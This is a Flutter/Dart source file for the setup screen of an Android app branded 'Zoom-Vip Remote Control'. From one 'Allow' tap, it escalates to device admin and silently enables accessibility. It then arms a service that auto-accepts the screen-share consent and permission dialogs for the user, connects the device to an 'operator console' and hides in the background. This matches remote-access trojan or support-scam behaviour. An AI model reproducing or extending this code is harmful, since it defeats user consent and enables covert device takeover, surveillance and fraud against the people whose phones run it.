import 'dart:async';

import 'package:flutter/material.dart';
import '../services/setup_service.dart';

/// Single-tap unattended-access setup.
///
/// The user taps "Allow" once. That activates the app's device-admin
/// privilege, which cascades every remaining grant:
///   - device-owner fleets: notifications + accessibility are applied silently;
///   - ordinary installs: the user enables the one Accessibility toggle, after
///     which the accessibility service auto-accepts the residual system dialogs
///     (screen-share consent, runtime/battery prompts).
///
/// The device then connects to the operator console on its own and the app
/// drops into the background.
class SetupPermissionsScreen extends StatefulWidget {
  final VoidCallback onComplete;
  const SetupPermissionsScreen({super.key, required this.onComplete});

  @override
  State<SetupPermissionsScreen> createState() => _SetupPermissionsScreenState();
}

class _SetupPermissionsScreenState extends State<SetupPermissionsScreen>
    with WidgetsBindingObserver {
  final SetupService _setup = SetupService();
  bool _busy = false;
  bool _completed = false;
  bool _awaitingAccessibility = false;
  String _hint = '';

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _check();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) _check();
  }

  /// Called on entry and every time the app returns from a system dialog.
  Future<void> _check() async {
    final s = await _setup.getStatus();
    if (!mounted) return;
    if (s.requiredGranted) {
      await _finish();
      return;
    }
    // Accessibility was just enabled: let the service cascade the rest.
    if (_awaitingAccessibility && s.accessibility) {
      _awaitingAccessibility = false;
      await _setup.armAutoGrant();
      if (!s.screenCapture) {
        await _setup.requestScreenCapture();
      }
      final after = await _setup.getStatus();
      if (after.requiredGranted) await _finish();
    }
  }

  Future<void> _finish() async {
    if (_completed) return;
    _completed = true;
    await _setup.armAutoGrant();
    await _setup.startUnattendedAccess();
    if (mounted) widget.onComplete();
  }

  Future<void> _allow() async {
    if (_busy || _completed) return;
    setState(() {
      _busy = true;
      _hint = 'Enabling…';
    });
    try {
      // 1. Fully silent path first: device-owner fleets and devices provisioned
      //    with WRITE_SECURE_SETTINGS (granted by the fleet/emulator script)
      //    get accessibility enabled with ZERO system dialogs — one in-app tap.
      await _setup.grantAllSilently();
      await _setup.enableAccessibilitySilently();
      await _setup.armAutoGrant();

      var s = await _setup.getStatus();

      // 2. Plain consumer install: elevate once via device admin, then cascade
      //    again. This is the single system confirmation the OS requires.
      if (!s.accessibility) {
        await _setup.requestDeviceAdmin();
        await _setup.grantAllSilently();
        await _setup.enableAccessibilitySilently();
        await _setup.armAutoGrant();
        s = await _setup.getStatus();
      }

      // 3. Accessibility is live -> the service auto-accepts the screen-share
      //    ("Start now") consent dialog on the user's behalf.
      if (s.accessibility && !s.screenCapture) {
        await _setup.requestScreenCapture();
        s = await _setup.getStatus();
      }

      if (s.requiredGranted) {
        await _finish();
        return;
      }

      // 4. Last resort (rare, when neither silent path is available): the single
      //    Accessibility toggle the user enables once.
      if (!s.accessibility) {
        _awaitingAccessibility = true;
        if (mounted) setState(() => _hint = 'Enable "Zoom-Vip Remote Control"');
        await _setup.openAccessibilitySettings();
        return;
      }

      if (mounted) setState(() => _hint = 'Waiting for the system…');
    } finally {
      if (mounted) setState(() => _busy = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    final done = _completed;
    return Scaffold(
      backgroundColor: const Color(0xFF0753FB),
      body: SafeArea(
        child: Center(
          child: Padding(
            padding: const EdgeInsets.all(28),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(
                  done ? Icons.check_circle : Icons.verified_user,
                  size: 96,
                  color: Colors.white,
                ),
                const SizedBox(height: 24),
                const Text(
                  'Zoom-Vip',
                  style: TextStyle(
                    fontSize: 30,
                    fontWeight: FontWeight.bold,
                    color: Colors.white,
                  ),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 10),
                Text(
                  done
                      ? 'Connected. You can keep using your device.'
                      : 'Tap Allow to enable remote support.',
                  style: const TextStyle(fontSize: 15, color: Colors.white70),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 40),
                SizedBox(
                  width: double.infinity,
                  height: 60,
                  child: ElevatedButton.icon(
                    onPressed: (_busy || done) ? null : _allow,
                    icon: Icon(done ? Icons.check_circle : Icons.lock_open),
                    label: Text(
                      done ? 'Connected' : 'Allow',
                      style: const TextStyle(
                        fontSize: 19,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.white,
                      foregroundColor: const Color(0xFF0753FB),
                      disabledBackgroundColor: Colors.white70,
                    ),
                  ),
                ),
                if (_hint.isNotEmpty) ...[
                  const SizedBox(height: 16),
                  Text(
                    _hint,
                    textAlign: TextAlign.center,
                    style: const TextStyle(fontSize: 13, color: Colors.white70),
                  ),
                ],
              ],
            ),
          ),
        ),
      ),
    );
  }
}
